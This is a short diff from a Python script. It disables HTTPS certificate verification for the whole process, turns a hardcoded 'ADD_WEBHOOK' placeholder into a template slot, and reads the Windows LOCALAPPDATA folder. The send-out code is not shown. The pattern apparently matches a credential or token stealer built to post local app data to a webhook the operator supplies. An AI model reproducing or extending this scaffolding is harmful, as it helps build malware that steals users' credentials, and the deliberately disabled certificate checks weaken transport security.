@@ -8,7 +8,7 @@ from urllib.request import Request, urlopen
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 
-WEBHOOK = "ADD_WEBHOOK" #Change me!!!
+WEBHOOK = "{WEBHOOK}"
 
 if os.name == "nt":
     LOCAL = os.getenv("LOCALAPPDATA")
